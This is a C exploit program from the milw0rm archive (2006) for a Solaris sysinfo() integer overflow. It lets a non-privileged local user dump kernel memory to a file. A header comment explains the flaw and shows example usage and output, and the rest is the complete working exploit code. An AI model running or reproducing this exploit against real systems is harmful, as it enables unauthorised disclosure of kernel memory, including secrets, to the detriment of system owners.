/* Sun Microsystems Solaris sysinfo() Kernel Memory Disclosure exploit
 * ===================================================================
 * Local exploitation of an integer overflow vulnerability in Sun
 * Microsystems Inc. Solaris allows attackers to read kernel memory from a
 * non-privileged userspace process. The vulnerability specifically exists
 * due to an integer overflow in /usr/src/uts/common/syscall/systeminfo.c
 *
 * Example Use.
 * $ uname -a 
 * SunOS sunos 5.11 snv_30 sun4u sparc SUNW,Ultra-250
 * $ ./prdelka-vs-SUN-sysinfo kbuf
 * [ Solaris <= 10 sysinfo() kernel memory information leak
 * [ Wrote 1294967293 bytes to kbuf
 * $ ls -al kbuf
 * -rwx------   1 user     other       1.2G Jul 21 23:56 kbuf
 *
 * -prdelka
 */
#include <sys/systeminfo.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define bufsize 1294967293

int main(int argc,char* argv[]){
        int fd;
 	ssize_t out;
        char* output_buffer;
	if(argc < 2){
		printf("[ Use with <filepath>\n");
		exit(1);
	}
        printf("[ Solaris <= 10 sysinfo() kernel memory information leak\n");
	output_buffer = malloc(bufsize);
        memset(output_buffer,0,bufsize);
        sysinfo(SI_SYSNAME,output_buffer,0);
        fd = open(argv[1],O_RDWR|O_CREAT,0700);
	if(fd!=-1){
	        out = write(fd,output_buffer,bufsize);
		printf("[ Wrote %u bytes to %s\n",out,argv[1]);
	        close(fd);
	}
        exit(0);
}

// milw0rm.com [2006-07-24]
